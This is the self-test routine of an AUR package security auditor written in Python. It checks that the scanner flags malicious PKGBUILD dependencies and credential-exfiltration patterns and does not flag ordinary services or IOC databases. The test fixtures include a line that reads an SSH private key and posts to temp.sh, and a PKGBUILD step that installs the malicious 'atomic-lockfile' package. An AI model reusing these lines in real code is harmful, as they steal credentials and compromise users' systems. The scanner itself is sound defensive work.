def self_test():
    failures = []

    class R:
        pass

    def classify(name, text, path="/usr/lib/example/app.py"):
        result = R()
        result.findings = core.scan_text(name, path, text)
        result.name = name
        result.version = "1"
        result.aur_status = "aur"
        result.aur_maintainer = "tester"
        result.aur_out_of_date = None
        result.files_checked = 1
        result.bytes_checked = len(text)
        result.integrity_output = ""
        result.errors = []
        return normalize_result(result, [], {})

    safe = classify("safe-app", "requests.get(url); credentials = get_credentials()")
    if safe["verdict"] in {"threat", "suspicious"}:
        failures.append("Generischer Credential-/Netzwerkbezug erzeugt HIGH/CRITICAL")

    security_db = classify("security-tool", f'IOCS = ["{KNOWN_C2}", "atomic-lockfile"]', "/usr/share/security-tool/iocs.json")
    if security_db["verdict"] in {"threat", "suspicious"}:
        failures.append("IOC-Datenbank wird fälschlich als Bedrohung gewertet")

    bad_dep = classify("bad", "prepare(){ npm install atomic-lockfile; }", "/home/test/.cache/yay/bad/PKGBUILD")
    if bad_dep["verdict"] != "threat":
        failures.append("Atomic-Arch-Abhängigkeit im PKGBUILD nicht erkannt")

    exfil = classify("stealer", "open('/home/u/.ssh/id_ed25519'); requests.post('https://temp.sh/upload')", "/usr/bin/stealer.py")
    if exfil["verdict"] != "suspicious":
        failures.append("Credential-/Upload-Korrelation nicht erkannt")

    service = classify("daemon", "[Service]\\nExecStart=/usr/bin/daemon\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target", "/usr/lib/systemd/system/daemon.service")
    if service["verdict"] in {"threat", "suspicious"}:
        failures.append("Normaler systemd-Service erzeugt HIGH/CRITICAL")

    elf_result = R()
    elf_result.findings = [core.Finding("high", "elf-unsafe-interpreter", "elf-test", "/usr/bin/elf-test", "unsafe", "/tmp/loader")]
    elf_result.name, elf_result.version = "elf-test", "1"
    elf_result.aur_status, elf_result.aur_maintainer, elf_result.aur_out_of_date = "aur", "tester", None
    elf_result.files_checked, elf_result.bytes_checked = 1, 1
    elf_result.integrity_output, elf_result.errors, elf_result.security_surface = "", [], []
    elf_result.source_provenance, elf_result.aur_history = {}, {}
    if normalize_result(elf_result, [], {})["verdict"] != "suspicious":
        failures.append("Unsicherer ELF-Interpreter wird nicht als verdächtig korreliert")

    surface = core.security_surface_for_path("/etc/sudoers.d/example")
    if not surface or surface.get("kind") != "sudoers":
        failures.append("Security-Surface-Klassifikation für sudoers fehlt")

    try:
        if parse_aur_target("https://aur.archlinux.org/packages/yay") != "yay":
            failures.append("AUR-URL wird nicht korrekt in einen Paketnamen aufgelöst")
        try:
            parse_aur_target("https://example.org/packages/yay")
            failures.append("Fremde Preflight-URL wurde akzeptiert")
        except ValueError:
            pass
    except Exception as exc:
        failures.append(f"Preflight-Zielparser: {exc}")

    deep_fixture = {"build": {"log": "ok"}, "namcap": {"output": "none"}, "package": "fixture"}
    try:
        with zipfile.ZipFile(io.BytesIO(deep_evidence_bundle(deep_fixture))) as archive:
            if {"deep-report.json", "build.log", "namcap.txt", "manifest.sha256"} - set(archive.namelist()):
                failures.append("Deep-Evidence-Bundle unvollständig")
    except Exception as exc:
        failures.append(f"Deep-Evidence-Bundle: {exc}")

    if VERSION != core.VERSION:
        failures.append(f"Versionsabweichung Launcher={VERSION} Core={core.VERSION}")

    if failures:
        print(f"AUR Security Auditor {VERSION} self-test: FAILED")
        for failure in failures:
            print(" ✗", failure)
        return 1
    print(f"AUR Security Auditor {VERSION} self-test: OK")
    print(" ✓ version consistency")
    print(" ✓ IOC database false-positive regression")
    print(" ✓ Atomic Arch manifest detection")
    print(" ✓ credential/upload correlation")
    print(" ✓ ordinary systemd service remains non-critical")
    print(" ✓ ELF hardening and security-surface classification")
    print(" ✓ safe preflight target parser")
    return 0


